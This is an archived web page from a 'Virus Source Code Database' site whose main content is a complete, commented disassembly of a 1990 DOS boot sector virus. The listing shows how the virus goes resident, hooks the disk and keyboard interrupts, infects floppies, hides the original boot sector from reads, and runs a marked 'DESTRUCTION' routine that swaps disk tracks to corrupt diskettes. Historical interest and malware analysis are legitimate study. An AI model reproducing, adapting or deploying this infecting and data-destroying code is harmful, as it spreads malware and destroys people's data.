<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: xboot_asm</title>
<meta name="KEYWORDS" content="xboot.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for xboot.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="x_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_1_asm.php">x_1_asm</a><br>
<a href="x-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x-1_asm.php">x-1_asm</a><br>
<a href="x_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_2_asm.php">x_2_asm</a><br>
<a href="x-2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x-2_asm.php">x-2_asm</a><br>
<a href="xa1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xa1__asm.php">xa1__asm</a><br>
<a href="xa1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xa1_asm.php">xa1_asm</a><br>
<a href="x__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x__asm.php">x__asm</a><br>
<a href="x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/x_asm.php">x_asm</a><br>
<a href="xboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xboot_asm.php">xboot_asm</a><br>
<a href="xdx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xdx_asm.php">xdx_asm</a><br>
<a href="xmas_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xmas_pas.php">xmas_pas</a><br>
<a href="xph-1029_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph-1029_asm.php">xph-1029_asm</a><br>
<a href="xph_1100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph_1100_asm.php">xph_1100_asm</a><br>
<a href="xph-1100_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xph-1100_asm.php">xph-1100_asm</a><br>
<a href="xxx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xxx_asm.php">xxx_asm</a><br>
<a href="xyz__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz__asm.php">xyz__asm</a><br>
<a href="xyz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz_asm.php">xyz_asm</a><br>
<a href="xyz-v2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/xyz-v2_asm.php">xyz-v2_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;------------------------------------------------------------------
; boot sector virus
;
; sample obtained from Vesselin Bontchev 16 october 1990 in Kiev
;
; dissasembled: Andrzej Kadlof December 7, 1990
;
; (C) Polish Section of Virus Information Bank
;------------------------------------------------------------------

; virus entry point

7C00 33FF          XOR     DI,DI
7C02 8EDF          MOV     DS,DI       ; BIOS segment

7C04 BE007C        MOV     SI,7C00     ; virus base
7C07 8BDE          MOV     BX,SI

7C09 FA            CLI                 ; set stack
7C0A 8ED7          MOV     SS,DI
7C0C 8BE6          MOV     SP,SI
7C0E FB            STI

7C0F A11304        MOV     AX,[0413]   ; top of RAM for DOS use
7C12 48            DEC     AX          ; reserve 1 Kb for virus
7C13 A31304        MOV     [0413],AX

7C16 B106          MOV     CL,06       ; convert into paragraphs
7C18 D3E0          SHL     AX,CL

7C1A 8EC0          MOV     ES,AX       ; new virus location
7C1C 06            PUSH    ES          ; segment on stack
7C1D BD2700        MOV     BP,0027     ; offset of entry point in nev location
7C20 55            PUSH    BP          ; on stack
7C21 B90001        MOV     CX,0100     ; virus size in words
7C24 F3            REPZ                ; move
7C25 A5            MOVSW
7C26 CB            RETF                ; jump to new location, here 7C27

7C27 BE4C00        MOV     SI,004C     ; addres of INT 13h
7C2A BF8F00        MOV     DI,008F     ; place holder
7C2D A5            MOVSW               ; move
7C2E A5            MOVSW

; set new INT 13h and INT 09h

7C2F FA            CLI
7C30 C744FC1601    MOV     WORD PTR [SI-04],0116  ; new offset
7C35 8C44FE        MOV     [SI-02],ES  ; new segment
7C38 BE2400        MOV     SI,0024     ; addres of INT 9
7C3B BFF401        MOV     DI,01F4     ; place holder
7C3E A5            MOVSW               ; store
7C3F A5            MOVSW
7C40 C744FCC301    MOV     WORD PTR [SI-04],01C3  ; new INT 9 offset
7C45 8C44FE        MOV     [SI-02],ES  ; new INT 9 segment
7C48 FB            STI

7C49 26            ES:
7C4A 803E740000    CMP     BYTE PTR [0074],00  ; number of instalation
7C4F 7411          JZ      7C62        ; skip counter adjusting on disk

7C51 26            ES:
7C52 FE0E7400      DEC     BYTE PTR [0074]  ; decrement counter

; store virus code back on disk with new counter value

7C56 53            PUSH    BX          ; store virus base offset in low RAM
7C57 33DB          XOR     BX,BX       ; buffer, start of vvirus code
7C59 B90100        MOV     CX,0001     ; track 0, starting sector 1
7C5C B600          MOV     DH,00       ; head 0
7C5E E81900        CALL    7C7A        ; write 1 sector, data as above
7C61 5B            POP     BX

7C62 1E            PUSH    DS
7C63 07            POP     ES          ; ES := 0

7C64 06            PUSH    ES          ; put on stack return address 
7C65 53            PUSH    BX          ; that is jump to legal boot sector
7C66 B90300        MOV     CX,0003     ; track 0, sector 3 (end of directory)
7C69 BA0001        MOV     DX,0100     ; head 1, current disk A:
7C6C E81300        CALL    7C82        ; read 1 sector, data as abave
7C6F CB            RETF                ; continue with oryginal boot sector

; flags, each for one floppy from A: to D:
;   bites  0F - infected
;          F0 - tracks swaped

7C70 00 00 00 00
7C74 1E                 ; counter, number of instalation
7C75 02                 ; caller INT 13h subfunction
7C76 107C 770B          ; callers INT 13h buffer

;----------------------------------------------------
; write 1 sector to disk
;   address of source buffer and destination sector 
;   is provided by caller

7C7A B80103        MOV     AX,0301     ; write 1 sector
7C7D EB06          JMP     7C85        ; make old INT 13h

;--------------------------------------------------
; read 1 sector to buffer above virus code
;   address of source sector is provided by caller

7C7F BB0002        MOV     BX,0200     ; offset of buffer

;---------------------------------------------------
; read 1 sector to buffer
;   address of source sector and destination buffer
;   is provided by caller

7C82 B80102        MOV     AX,0201     ; read 1 sector

;-------------------
; make old INT 13h

7C85 53            PUSH    BX          ; store offset of buffer
7C86 51            PUSH    CX          ; store track, sector (CH, CL)
7C87 52            PUSH    DX          ; store head, disk (DH, DL)
7C88 9C            PUSHF               ; simulate INT 13h
7C89 0E            PUSH    CS          ; return address
7C8A BD9300        MOV     BP,0093     ; return address
7C8D 55            PUSH    BP

; old INT 13h

7C8E EA290300C8    JMP     C800:0329   ; address is patched during instalation

; exit after above far call

7C93 5A            POP     DX          ; restore registers
7C94 59            POP     CX
7C95 5B            POP     BX
7C96 C3            RET

;-------------------------------------------
; read boot sector and check is it infected
;   on exit 
;     set Carry if error I/O
;     if no error then reset Z if infected

7C97 B90100        MOV     CX,0001     ; track 0, sector 1
7C9A B600          MOV     DH,00       ; head 0

;---------------------------------------------
; read 1 sector above virus code and look for 
; virus signature in DS:[BX]

7C9C E8E0FF        CALL    7C7F        ; read 1 sector above virus code
7C9F 7205          JB      7CA6        ; error, exit

7CA1 813F33FF      CMP     WORD PTR [BX],FF33  ; virus signature, set Z
7CA5 F8            CLC                 ; no error
7CA6 C3            RET

;--------------
; infect disk

7CA7 E8EDFF        CALL    7C97        ; check boot sector
7CAA 721D          JB      7CC9        ; error, RET

7CAC 741B          JZ      7CC9        ; infected, RET

7CAE 813EFE0355AA  CMP     WORD PTR [03FE],AA55  ; and of sector marker
7CB4 F8            CLC
7CB5 7512          JNZ     7CC9        ; RET

; write oryginal boot sector

7CB7 B103          MOV     CL,03       ; sector 3
7CB9 B601          MOV     DH,01       ; head 1
7CBB E8BCFF        CALL    7C7A        ; write 1 sector, data as above
7CBE 7209          JB      7CC9        ; RET

7CC0 33DB          XOR     BX,BX       ; offset of virus code
7CC2 B101          MOV     CL,01       ; sector 1
7CC4 B600          MOV     DH,00       ; head 0
7CC6 E8B1FF        CALL    7C7A        ; write 1 sector, data as above
7CC9 C3            RET

;--------------------
; infect diskette

7CCA E8DAFF        CALL    7CA7        ; infect diskette
7CCD 72FA          JB      7CC9        ; error, RET

7CCF E8C5FF        CALL    7C97        ; check boot sector
7CD2 72F5          JB      7CC9        ; error, RET

7CD4 7503          JNZ     7CD9        ; not infected, skip flag setting

7CD6 800D0F        OR      BYTE PTR [DI],0F   ; set flag: not infected

7CD9 803E740000    CMP     BYTE PTR [0074],00 ; instalation counter
7CDE 75E9          JNZ     7CC9        ; RET

7CE0 803E750002    CMP     BYTE PTR [0075],02 ; read service?
7CE5 75E2          JNZ     7CC9        ; RET

;====================================================
;      >>>>>>>>>   DESTRUCTION   <<<<<<<<<<<<<
;====================================================

; swap all sectors between track 0, head 0 and 
; track 27h, head 1

7CE7 800DF0        OR      BYTE PTR [DI],F0  ; set flag: tracks swaped
7CEA C41E7600      LES     BX,[0076]   ; users buffer
7CEE B90900        MOV     CX,0009     ; sector counter

; swap next sector

7CF1 51            PUSH    CX          ; store track 0 and sector number
7CF2 B600          MOV     DH,00       ; head 0
7CF4 E88BFF        CALL    7C82        ; read 1 sector to user buffer
7CF7 B601          MOV     DH,01       ; head 1
7CF9 B527          MOV     CH,27       ; track 27, sector number the same
7CFB 06            PUSH    ES          ; store address of user buffer
7CFC 53            PUSH    BX
7CFD 0E            PUSH    CS          ; restore address of own buffer
7CFE 07            POP     ES
7CFF E87DFF        CALL    7C7F        ; read 1 sector to own buffer
7D02 B500          MOV     CH,00       ; track 0
7D04 B600          MOV     DH,00       ; head 0
7D06 E871FF        CALL    7C7A        ; write 1 sector from own buffer
7D09 5B            POP     BX          ; restore user address of buffer
7D0A 07            POP     ES
7D0B B601          MOV     DH,01       ; head 1
7D0D B527          MOV     CH,27       ; track 27h
7D0F E868FF        CALL    7C7A        ; write 1 sector from user buffer
7D12 59            POP     CX          ; restore sector counter
7D13 E2DC          LOOP    7CF1

7D15 C3            RET

;-----------------------
; new INT 13h handler

7D16 80FA03        CMP     DL,03       ; floppy disk
7D19 770A          JA      7D25        ; not, exit

7D1B 80FC02        CMP     AH,02       ; read request?
7D1E 7205          JB      7D25        ; no, exit

7D20 80FC04        CMP     AH,04       ; verify/read/write request?
7D23 7603          JBE     7D28        ; yes

7D25 E966FF        JMP     7C8E        ; exit, jump to old INT 13h

; AH = 2, 3, 4 service

7D28 1E            PUSH    DS          ; store user DS
7D29 0E            PUSH    CS
7D2A 1F            POP     DS          ; set DS to virus segment
7D2B 88267500      MOV     [0075],AH   ; store request
7D2F 8C067800      MOV     [0078],ES   ; callers buffer segment
7D33 891E7600      MOV     [0076],BX   ; callers buffer offset
7D37 55            PUSH    BP          ; store rest of registers
7D38 51            PUSH    CX
7D39 52            PUSH    DX
7D3A 57            PUSH    DI

7D3B BF7000        MOV     DI,0070     ; address of flags
7D3E B600          MOV     DH,00       ; clear high byte
7D40 03FA          ADD     DI,DX       ; adjust flag to current disk

7D42 06            PUSH    ES
7D43 50            PUSH    AX
7D44 33C0          XOR     AX,AX
7D46 8EC0          MOV     ES,AX
7D48 40            INC     AX          ; set bit 1
7D49 8ACA          MOV     CL,DL       ; disk number
7D4B D2E0          SHL     AL,CL       ; move bit 1 left
7D4D 26            ES:
7D4E 84063F04      TEST    [043F],AL   ; disk motor status
7D52 751B          JNZ     7D6F        ; skip test, drive is running

; search for virus signature in head: 1, track 27, sector number 1
; if diskette is destroyed then the virus is there

7D54 0E            PUSH    CS
7D55 07            POP     ES
7D56 B90127        MOV     CX,2701     ; track 27, first sector number 1
7D59 B601          MOV     DH,01       ; head 1
7D5B E83EFF        CALL    7C9C        ; read 1 sector and check virus signature
7D5E B000          MOV     AL,00       ; clear flag: not infected, not swaped
7D60 7204          JB      7D66        ; error

7D62 7502          JNZ     7D66        ; signature not found, leave flag 0

7D64 B0F0          MOV     AL,F0       ; flag: swaped and infected

7D66 AA            STOSB               ; store flag
7D67 4F            DEC     DI          ; restore DI
7D68 3C00          CMP     AL,00       ; infected?
7D6A 7503          JNZ     7D6F        ; skip infection

7D6C E85BFF        CALL    7CCA        ; infect disk and destroy if counter = 0

7D6F 8A1D          MOV     BL,[DI]     ; get flag
7D71 58            POP     AX          ; restore registers
7D72 07            POP     ES
7D73 5F            POP     DI
7D74 5A            POP     DX
7D75 59            POP     CX
7D76 51            PUSH    CX
7D77 52            PUSH    DX
7D78 F6C30F        TEST    BL,0F       ; disk infected?
7D7B 7416          JZ      7D93        ; not

7D7D 80FE00        CMP     DH,00       ; head 0
7D80 750B          JNZ     7D8D        ; no, maybe sector3?

7D82 83F901        CMP     CX,+01      ; track 0, sector 1
7D85 750C          JNZ     7D93

; show oryginal boot sector

7D87 B103          MOV     CL,03       ; sector 3
7D89 B601          MOV     DH,01       ; head 1
7D8B EB06          JMP     7D93

7D8D 83F903        CMP     CX,+03      ; sector 3
7D90 7501          JNZ     7D93        ; no

7D92 49            DEC     CX          ; show one sector before

7D93 F6C3F0        TEST    BL,F0       ; tracks swaped?
7D96 7418          JZ      7DB0        ; no, make old INT 13h and exit

; Disk is destroyed, maybe user want to read track 27h, head 1 
; or track 0, head 0? If yes then show what he expect.

7D98 80FE00        CMP     DH,00       ; head 0
7D9B 740B          JZ      7DA8        ; yes

7D9D 80FD27        CMP     CH,27       ; track 27h?
7DA0 750E          JNZ     7DB0        ; make old INT 13h and exit

; real address of old track 27h, head 1

7DA2 B500          MOV     CH,00       ; track 0
7DA4 B600          MOV     DH,00       ; head 0
7DA6 EB08          JMP     7DB0        ; make old INT 13h and exit

7DA8 0AED          OR      CH,CH       ; track 0?
7DAA 7504          JNZ     7DB0        ; no, make old INT 13h and exit

; real address of old track 0, head 0

7DAC B527          MOV     CH,27       ; track 27h
7DAE B601          MOV     DH,01       ; head 1

; house keeping and exit to user

7DB0 8B1E7600      MOV     BX,[0076]   ; restore user buffer
7DB4 E8CEFE        CALL    7C85        ; make old INT 13h
7DB7 5A            POP     DX
7DB8 8BEC          MOV     BP,SP
7DBA 9C            PUSHF
7DBB 59            POP     CX
7DBC 894E0A        MOV     [BP+0A],CX  ; set flags
7DBF 59            POP     CX
7DC0 5D            POP     BP
7DC1 1F            POP     DS
7DC2 CF            IRET

;--------------------
; new INT 9 handler

7DC3 50            PUSH    AX
7DC4 E460          IN      AL,60       ; read key
7DC6 3C53          CMP     AL,53       ; DEL key
7DC8 7528          JNZ     7DF2        ; no, exit

; key DEL is pressed

7DCA 1E            PUSH    DS
7DCB 33C0          XOR     AX,AX
7DCD 8ED8          MOV     DS,AX
7DCF A01704        MOV     AL,[0417]   ; keyboard status bits
7DD2 F6D0          NOT     AL
7DD4 A80C          TEST    AL,0C       ; ALT + CTRL
7DD6 7519          JNZ     7DF1        ; not both, exit

7DD8 0E            PUSH    CS
7DD9 1F            POP     DS
7DDA 803E740000    CMP     BYTE PTR [0074],00  ; counter of instalation
7DDF 7410          JZ      7DF1        ; exit

7DE1 B020          MOV     AL,20       ; enable hardware interrupts
7DE3 E620          OUT     20,AL
7DE5 B200          MOV     DL,00       ; disk A:
7DE7 33C0          XOR     AX,AX       ; reset disk
7DE9 E899FE        CALL    7C85        ; make old INT 13h

7DEC 0E            PUSH    CS
7DED 07            POP     ES
7DEE E8B6FE        CALL    7CA7        ; infect disk

7DF1 1F            POP     DS

7DF2 58            POP     AX
7DF3 EA87E900F0    JMP     F000:E987   ; address is patched during instalation

7DF8 0000
7DFA 0000
7DFC 5713          ; signature of ping pong
7DFE 55AA          ; and of boot sector marker

;-----------------------------------------------------------
; Virus action during instalation:
;
;   set DS:SI to virus start, DS := 0, SI := 7C00
;   set stack below 0000:7C00
;   decrement RAM size avaible for DOS ([0000:0413])
;   copy virus code to high memory and jump there
;   intercepte INT 13h and INT 09h
;   check state of instalation counter, if above 0 then 
;      decrement it and adjust counter on disk
;   read oryginal boot sector from disk and jump to it
;
;------------------------------------------------------------
; INT 13h handler (cs:0116h):
;
;
;
;------------------------------------------------------------
;
; INT 09h handler (cs:01C3h):
;
;   read key from port 60h
;   if not DEL key then exit to old INT 09h
;   get keyboard status bites
;   if not ALT and CTRL depresed then exit to old INT 09h
;   enable hardware interupts
;   reset disk A:
;   infect diskette in drive A:
;   exit to old INT 09h


</textarea></td></tr></table></body></html>
